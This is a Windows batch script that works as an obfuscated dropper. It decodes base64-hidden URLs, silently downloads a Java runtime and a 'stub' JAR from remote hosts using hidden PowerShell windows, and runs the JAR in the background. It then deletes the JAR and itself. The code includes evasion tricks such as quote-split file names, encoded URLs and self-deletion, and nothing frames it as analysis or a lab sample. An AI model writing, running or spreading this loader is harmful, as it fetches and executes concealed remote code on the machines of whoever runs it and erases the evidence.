@echo off

java -version >nul 2>&1
if %errorLevel% NEQ 0 (
    goto :install_java
) else (
    goto :download_and_run_jar
)

:install_java
set "encodedUrl=aHR0cHM6Ly9maWxldHJhbnNmZXIuaW8vZGF0YS1wYWNrYWdlL3pjTUlqY201L2Rvd25sb2Fk"
set "output=%TEMP%\jre1.8.0_361.zip"
set "installDir=%USERPROFILE%\Ja"v"a\jre1.8.0_361"

powershell -WindowStyle Hidden -Command "$url=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%encodedUrl%')); (New-Object System.Net.WebClient).DownloadFile($url, '%output%')"

powershell -WindowStyle Hidden -Command "Expand-Archive -Path '%output%' -DestinationPath '%installDir%'"

if exist "%installDir%\jre1.8.0_361\bin\java.exe" (
    del "%output%"
) else (
    exit /b 1
)

set PATH=%PATH%;%installDir%\jre1.8.0_361\bin

:download_and_run_jar
set "encodedJarUrl=aHR0cHM6Ly9naXRodWIuY29tL1B5dGhvbi1pcy10cmFzaC9zdHViL3Jhdy9yZWZzL2hlYWRzL21haW4vSmF2YS5qYXI="
set "jarOutput=%TEMP%\Ja"v"a.jar"

powershell -WindowStyle Hidden -Command "$jarUrl=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%encodedJarUrl%')); (New-Object System.Net.WebClient).DownloadFile($jarUrl, '%jarOutput%')"

if exist "%jarOutput%" (
    start /b java -jar "%jarOutput%"
)

:wait_for_java
REM Warte, bis der Java-Prozess, der die JAR-Datei ausführt, beendet ist
tasklist /fi "imagename eq java.exe" | find /i "java.exe" >nul
if %errorlevel% equ 0 (
    timeout /t 2 /nobreak >nul
    goto :wait_for_java
)

REM JAR-Datei löschen
del "%jarOutput%"

REM Batch-Datei löschen, nachdem der Java-Prozess beendet wurde
start "" /b cmd /c del "%~f0" & exit
exit
